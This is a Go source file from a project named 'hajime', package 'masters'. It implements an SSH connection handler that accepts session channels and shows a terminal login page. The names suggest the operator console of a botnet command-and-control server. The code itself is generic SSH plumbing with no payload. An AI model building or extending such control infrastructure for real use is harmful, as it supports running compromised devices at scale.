package masters

import (
	"hajime/source/masters/terminal"
	"hajime/source/masters/views"
	"log"
	"net"

	"golang.org/x/crypto/ssh"
)

//handle will consume the incoming connection within a goroutine and handle accordingly
func (s *Server) handle(conn net.Conn) {
	defer func() {
		err := recover()
		if err == nil {
			return
		}

		log.Println("(masters/handle)", err)
	}()

	serverConn, channels, requests, err := ssh.NewServerConn(conn, s.server)
	if err != nil {
		panic(err)
	}

	go ssh.DiscardRequests(requests)
	for channel := range channels {
		if channel.ChannelType() != "session" {
			channel.Reject(ssh.UnknownChannelType, "UnknownChannelType")
			continue
		}

		channel, requests, err := channel.Accept()
		if err != nil {
			continue
		}

		//handles all the requests which we received from this terminal
		go func(requests <-chan *ssh.Request) {
			for request := range requests {
				switch request.Type {

				default:
					if !request.WantReply {
						continue
					}

					err := request.Reply(request.WantReply, make([]byte, 0))
					if err != nil {
						panic(err)
					}

				case "pty-req", "shell", "exec":
					err := request.Reply(request.WantReply, make([]byte, 0))
					if err != nil {
						panic(err)
					}
				}
			}
		}(requests)

		/* makes a terminal and then handles the conn */
		term := terminal.New(channel, serverConn)
		if err := views.LoginPage(term); err != nil {
			panic(err)
		}
	}
}
